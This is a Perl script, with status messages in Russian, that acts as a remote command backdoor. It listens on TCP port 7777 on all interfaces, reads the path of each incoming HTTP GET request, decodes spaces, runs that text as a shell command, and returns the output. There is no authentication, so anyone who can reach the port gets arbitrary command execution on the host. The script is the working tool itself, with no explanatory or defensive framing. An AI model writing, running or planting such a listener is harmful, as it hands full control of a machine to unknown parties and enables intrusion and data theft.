#!/usr/bin/perl -w

use strict;
use IO::Socket;

sub str_replace {
	my $replace_this = shift;
	my $with_this  = shift; 
	my $string   = shift;
	
	my $length = length($string);
	my $target = length($replace_this);
	
	for(my $i=0; $i<$length - $target + 1; $i++) {
		if(substr($string,$i,$target) eq $replace_this) {
			$string = substr($string,0,$i) . $with_this . substr($string,$i+$target);
		}
	}
	return $string;
}

my $port = 7777;
socket(SOCK, PF_INET,SOCK_STREAM, getprotobyname('tcp')) or die ("Не могу создать сокет!");
setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, 1);

my $paddr = sockaddr_in($port, INADDR_ANY);
bind(SOCK, $paddr) or die("Не могу привязать порт!");

print "Ожидаем подключения...\n";
listen(SOCK, SOMAXCONN);
while (my $client_addr = accept(CLIENT, SOCK)){
  my ($client_port, $client_ip) = sockaddr_in($client_addr);
  my $client_ipnum = inet_ntoa($client_ip);
  my $client_host = gethostbyaddr($client_ip, AF_INET);

  my $data;
  my $count = sysread(CLIENT, $data, 1024);

  my $cmd = substr(
      $data,
      index($data, "GET /") + 5,
      index($data, "HTTP") - 6
  );

      $cmd = str_replace("%20", " ", $cmd);

    my $output = `$cmd`;
    print CLIENT "$output";

    print("=> $cmd done\n");

  close(CLIENT);
}
